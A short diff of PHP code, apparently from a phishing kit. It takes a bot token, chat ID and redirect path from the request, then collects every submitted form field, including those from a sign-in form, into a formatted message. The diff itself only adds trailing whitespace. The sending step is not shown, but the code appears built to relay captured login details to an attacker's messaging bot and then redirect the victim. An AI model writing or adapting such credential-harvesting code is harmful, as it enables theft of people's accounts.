@@ -7,7 +7,7 @@ $chatId = $_POST['chatId'] ?? $defaultChatId ;
 $redirectUrl = isset($_POST['redUrl']) ? "../php/" . $_POST['redUrl'] : $defaultRedirectUrl;
 $decodedMessage = urldecode(file_get_contents('php://input'));
 parse_str($decodedMessage, $params);
-$formattedMessage = '';
+$formattedMessage = ''; 
 foreach ($params as $key => $value) {
     if (!in_array($key, ['botToken', 'chatId', 'redUrl', 'signin-continue-btn'])) {
         $formattedMessage .= "<pre>$key</pre> <code>" . htmlspecialchars($value) . "</code>\n";
